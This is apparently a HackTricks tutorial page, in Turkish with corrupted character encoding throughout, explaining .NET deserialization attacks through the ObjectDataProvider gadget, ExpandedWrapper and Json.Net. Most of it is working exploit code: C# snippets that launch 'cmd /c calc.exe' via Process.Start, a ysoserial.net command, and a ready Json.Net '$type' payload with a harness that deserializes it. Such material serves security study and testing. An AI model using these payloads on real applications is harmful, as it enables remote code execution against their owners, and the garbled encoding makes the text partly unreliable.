# Temel .Net deserializasyonu (ObjectDataProvider gadget, ExpandedWrapper ve Json.Net)

<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± yapmak** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

Bu yazÄ±, **ObjectDataProvider gadget'Ä±nÄ±n nasÄ±l sÃ¶mÃ¼rÃ¼ldÃ¼ÄŸÃ¼nÃ¼** ve bu gadget ile **Serialization kÃ¼tÃ¼phaneleri Json.Net ve xmlSerializer'Ä±n nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸini** anlamak iÃ§in ayrÄ±lmÄ±ÅŸtÄ±r.

## ObjectDataProvider Gadget

Belgelerden: _ObjectDataProvider SÄ±nÄ±fÄ±, bir baÄŸlama kaynaÄŸÄ± olarak kullanabileceÄŸiniz bir nesneyi sarmalar ve oluÅŸturur_.\
Evet, garip bir aÃ§Ä±klama, o zaman bu sÄ±nÄ±fÄ±n neden bu kadar ilginÃ§ olduÄŸuna bakalÄ±m: Bu sÄ±nÄ±f, bir nesneyi **sarmalamaya** izin verir, _**MethodParameters**_ kullanarak **keyfi parametreler** ayarlamak iÃ§in kullanÄ±lÄ±r ve ardÄ±ndan keyfi parametrelerle belirtilen keyfi nesnenin keyfi bir iÅŸlevini Ã§aÄŸÄ±rmak iÃ§in **MethodName** kullanÄ±lÄ±r.\
Bu nedenle, keyfi **nesne**, **parametrelerle birlikte iÅŸlevi Ã§alÄ±ÅŸtÄ±racaktÄ±r** ve deserializasyon sÄ±rasÄ±nda.

### **Bu nasÄ±l mÃ¼mkÃ¼n**

ObjectDataProvider'Ä±n tanÄ±mlandÄ±ÄŸÄ± ve uygulandÄ±ÄŸÄ± **System.Windows.Data** ad alanÄ±, `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF` konumundaki **PresentationFramework.dll** iÃ§inde bulunur.

[**dnSpy**](https://github.com/0xd4d/dnSpy) kullanarak ilgilendiÄŸimiz sÄ±nÄ±fÄ±n kodunu **inceleyebilirsiniz**. AÅŸaÄŸÄ±daki resimde, **PresentationFramework.dll --> System.Windows.Data --> ObjectDataProvider --> Method name** kodunu gÃ¶rÃ¼yoruz.

![](<../../.gitbook/assets/image (299).png>)

GÃ¶zlemleyebileceÄŸiniz gibi, `MethodName` ayarlandÄ±ÄŸÄ±nda `base.Refresh()` Ã§aÄŸrÄ±lÄ±r, ne yaptÄ±ÄŸÄ±na bakalÄ±m:

![](<../../.gitbook/assets/image (300).png>)

Tamam, ÅŸimdi `this.BeginQuery()`'e ne yaptÄ±ÄŸÄ±nÄ± gÃ¶relim. `BeginQuery`, `ObjectDataProvider` tarafÄ±ndan geÃ§ersiz kÄ±lÄ±nÄ±r ve aÅŸaÄŸÄ±daki iÅŸlemi yapar:

![](<../../.gitbook/assets/image (301).png>)

Kodun sonunda `this.QueryWorke(null)` Ã§aÄŸrÄ±ldÄ±ÄŸÄ±na dikkat edin. Åimdi bunun neyi Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ± gÃ¶relim:

![](<../../.gitbook/assets/image (302) (1).png>)

Bu, `QueryWorker` fonksiyonunun tamamÄ± olmasa da, ilginÃ§ kÄ±smÄ±nÄ± gÃ¶steriyor: Kod, **`this.InvokeMethodOnInstance(out ex);`'Ä± Ã§aÄŸÄ±rÄ±yor**, bu, **ayarlanan yÃ¶ntemin Ã§aÄŸrÄ±ldÄ±ÄŸÄ±** satÄ±rdÄ±r.

EÄŸer sadece _**MethodName**_\*\* ayarlayarak Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± kontrol etmek isterseniz, bu kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```java
using System.Windows.Data;
using System.Diagnostics;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ObjectDataProvider myODP = new ObjectDataProvider();
myODP.ObjectType = typeof(Process);
myODP.MethodParameters.Add("cmd.exe");
myODP.MethodParameters.Add("/c calc.exe");
myODP.MethodName = "Start";
}
}
}
```
Not: `System.Windows.Data`'yÄ± yÃ¼klemek iÃ§in _C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll_ dosyasÄ±nÄ± referans olarak eklemeniz gerektiÄŸini unutmayÄ±n.

## ExpandedWrapper

Ã–nceki saldÄ±rÄ±yÄ± kullandÄ±ÄŸÄ±nÄ±zda, **nesnenin** bir _**ObjectDataProvider**_ Ã¶rneÄŸi olarak **deserialize edileceÄŸi durumlar** olacaktÄ±r (Ã¶rneÄŸin DotNetNuke zafiyetinde, XmlSerializer kullanÄ±larak nesne `GetType` kullanÄ±larak deserialize edildi). ArdÄ±ndan, _ObjectDataProvider_ Ã¶rneÄŸinde **sarmalanan nesne tÃ¼rÃ¼ hakkÄ±nda bilgi sahibi olmayacaksÄ±nÄ±z** (`Process` Ã¶rneÄŸinde olduÄŸu gibi). DotNetNuke zafiyeti hakkÄ±nda daha fazla bilgiye [buradan](https://translate.google.com/translate?hl=en\&sl=auto\&tl=en\&u=https%3A%2F%2Fpaper.seebug.org%2F365%2F\&sandbox=1) ulaÅŸabilirsiniz.

Bu sÄ±nÄ±f, verilen bir Ã¶rnekte **kapsÃ¼llenmiÅŸ nesnelerin nesne tÃ¼rlerini belirtmek** iÃ§in kullanÄ±lÄ±r. Bu nedenle, bu sÄ±nÄ±f, bir kaynak nesneyi (_ObjectDataProvider_) yeni bir nesne tÃ¼rÃ¼ne kapsÃ¼leyebilir ve ihtiyacÄ±mÄ±z olan Ã¶zellikleri (_ObjectDataProvider.MethodName_ ve _ObjectDataProvider.MethodParameters_) saÄŸlayabilir.\
Bu, Ã¶nceki sunulan durumlar iÃ§in Ã§ok kullanÄ±ÅŸlÄ±dÄ±r, Ã§Ã¼nkÃ¼ **\_ObjectDataProvider**_\*\* Ã¶rneÄŸini bir \*\*_**ExpandedWrapper** \_ Ã¶rneÄŸi iÃ§ine **sardÄ±ÄŸÄ±mÄ±zda** bu sÄ±nÄ±f, _**MethodName**_'de belirtilen **fonksiyonu Ã§alÄ±ÅŸtÄ±racak** olan _**OjectDataProvider**_ nesnesini **oluÅŸturacaktÄ±r**.

Bu sarmalayÄ±cÄ±yÄ± aÅŸaÄŸÄ±daki kodla kontrol edebilirsiniz:
```java
using System.Windows.Data;
using System.Diagnostics;
using System.Data.Services.Internal;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
myExpWrap.ProjectedProperty0.ObjectInstance = new Process();
myExpWrap.ProjectedProperty0.MethodParameters.Add("cmd.exe");
myExpWrap.ProjectedProperty0.MethodParameters.Add("/c calc.exe");
myExpWrap.ProjectedProperty0.MethodName = "Start";
}
}
}
```
## Json.Net

[Resmi web sayfasÄ±nda](https://www.newtonsoft.com/json) bu kÃ¼tÃ¼phanenin, Json.NET'in gÃ¼Ã§lÃ¼ JSON serileÅŸtiricisi ile herhangi bir .NET nesnesini serileÅŸtirmeye ve serileÅŸtirmeyi geri alamaya izin verdiÄŸi belirtilmektedir. Bu nedenle, **ObjectDataProvider gadget'Ä±nÄ± geri alabilirsek**, bir nesneyi geri alarak bir **Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)** saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebiliriz.

### Json.Net Ã¶rneÄŸi

Ã–ncelikle, bu kÃ¼tÃ¼phaneyi kullanarak bir nesneyi **serileÅŸtirme/geri almayÄ±** nasÄ±l yapacaÄŸÄ±mÄ±zÄ± gÃ¶relim:
```java
using System;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Collections.Generic;

namespace DeserializationTests
{
public class Account
{
public string Email { get; set; }
public bool Active { get; set; }
public DateTime CreatedDate { get; set; }
public IList<string> Roles { get; set; }
}
class Program
{
static void Main(string[] args)
{
Account account = new Account
{
Email = "james@example.com",
Active = true,
CreatedDate = new DateTime(2013, 1, 20, 0, 0, 0, DateTimeKind.Utc),
Roles = new List<string>
{
"User",
"Admin"
}
};
//Serialize the object and print it
string json = JsonConvert.SerializeObject(account);
Console.WriteLine(json);
//{"Email":"james@example.com","Active":true,"CreatedDate":"2013-01-20T00:00:00Z","Roles":["User","Admin"]}

//Deserialize it
Account desaccount = JsonConvert.DeserializeObject<Account>(json);
Console.WriteLine(desaccount.Email);
}
}
}
```
### Json.Net'i KÃ¶tÃ¼ye Kullanma

[ysoserial.net](https://github.com/pwntester/ysoserial.net) kullanarak saldÄ±rÄ±yÄ± oluÅŸturdum:
```java
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
Bu kodda **saldÄ±rÄ±yÄ± test edebilirsiniz**, sadece Ã§alÄ±ÅŸtÄ±rÄ±n ve bir hesap makinesinin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± gÃ¶receksiniz:
```java
using System;
using System.Text;
using Newtonsoft.Json;

namespace DeserializationTests
{
class Program
{
static void Main(string[] args)
{
//Declare exploit
string userdata = @"{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
//Exploit to base64
string userdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userdata));

//Get data from base64
byte[] userdata_nob64 = Convert.FromBase64String(userdata_b64);
//Deserialize data
string userdata_decoded = Encoding.UTF8.GetString(userdata_nob64);
object obj = JsonConvert.DeserializeObject<object>(userdata_decoded, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
}
}
}
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde Ã§alÄ±ÅŸÄ±yor musunuz**? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keÅŸfedin.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter**'da beni takip edin ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
